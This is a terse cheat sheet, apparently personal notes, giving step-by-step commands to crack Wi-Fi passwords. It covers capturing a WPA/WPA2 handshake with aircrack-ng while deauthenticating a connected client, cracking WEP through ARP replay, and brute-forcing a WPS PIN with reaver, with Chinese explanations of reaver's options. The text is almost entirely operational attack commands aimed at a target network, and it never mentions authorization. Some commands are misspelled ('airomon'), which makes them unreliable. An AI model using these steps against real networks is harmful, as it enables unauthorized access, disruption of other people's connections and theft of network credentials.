#1 crack wap/wap2 wifi step (https://github.com/aircrack-ng/aircrack-ng)
    1) #iwconfig (find your wireless device name)
    2) #airomon start wlan0(name) (start the listening mode)
    3) #airodump-ng wlan0mon  (scan all wifi, mon-show your card haved started in listening mode)
    4) #airodump-ng wlan0mon -c 11(target channel) --bssid 14:75:90:9E:29:8E(target wifi mac address)  (get the handshake packet .wap)
    5) #airodump-ng wlan0mon -c 11 --bssid 14:75:90:9E:29:8E -w output-file(.cap)  (waiting until get the handshake)
    6) #aireplay-ng wlan0mon -0 10(times) -a 14:75:90:9E:29:8E(target wifi) -c E0:DC:FF:DC:5A:89(device concated wifi)    (make handshake fast)
    7) #aircrack-ng outpu-file.cap -w your-password-dict.txt (crack the password)
    8) #airomon stop wlan0mon  (stop listening mode)

#2 crack wep wifi step
    1) #iwconfig (find your wireless device name)
    2) #airomon start wlan0(name) (start the listening mode)
    3) #airodump-ng --ivs -w myfile-target.ivs -c 6 wlan0mon  (get packet)
    4) #aireplay-ng -3 -b 14:75:90:9E:29:8E(target wifi) -h E0:DC:FF:DC:5A:89(device concated wifi) wlan0mon  (ArpRequest crack make fast)
    5) #aircrack-ng -b 14:75:90:9E:29:8E(target wifi) myfile-target-0xx.ivs (crack the password)
    6) #airomon stop wlan0mon  (stop listening mode)

#3 crack wifi pin use reaver (https://github.com/t6x/reaver-wps-fork-t6x)
    1) #iwconfig (find your wireless device name)
    2) #airomon start wlan0(name) (start the listening mode)
    3) #wash -i wlan0mon 
    4) #reaver -i wlan0mon -b 14:75:90:9E:29:8E(target wifi) -a -S -d9 -t9 -vv  (get pin)
    5) #reaver -i wlan0mon -b 14:75:90:9E:29:8E(target wifi) -p your pin  (get password)
    6) #airomon stop wlan0mon  (stop listening mode)


    参数可参数说明：
    -i  无线网卡名称
    -b  目标AP的mac地址
    -a  自动检测目标AP最佳配置
    -S  使用最小的DH key，可以提高破解速度
    -vv  显示更多的非严重警告（注意这是 2 个小写字母 v）
    -d  即delay每穷举一次的闲置时间 预设为1秒
    -c  信道编号
    -p  PIN码四位或八位  //可以用8位直接找到密码。



